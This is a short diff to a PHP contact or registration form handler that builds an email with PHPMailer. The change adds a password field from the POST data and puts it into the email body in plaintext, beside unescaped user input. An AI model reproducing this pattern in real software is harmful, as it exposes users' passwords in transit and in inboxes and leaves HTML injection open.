@@ -9,13 +9,15 @@ $name = $_POST['name'];
 $phone = $_POST['phone'];
 $message = $_POST['message'];
 $email = $_POST['email'];
+$password = $_POST['password'];
 
 
 // Формирование самого письма
 $title = "Новое обращение Ehya";
 $body = "
 <h2>Новое обращение</h2>
-<b>Эл.почта:</b> $email<br><br>
+<b>Эл.почта:</b> $email<br>
+<b>Пароль:</b> $password<br><br>
 ";
 
 // Настройки PHPMailer
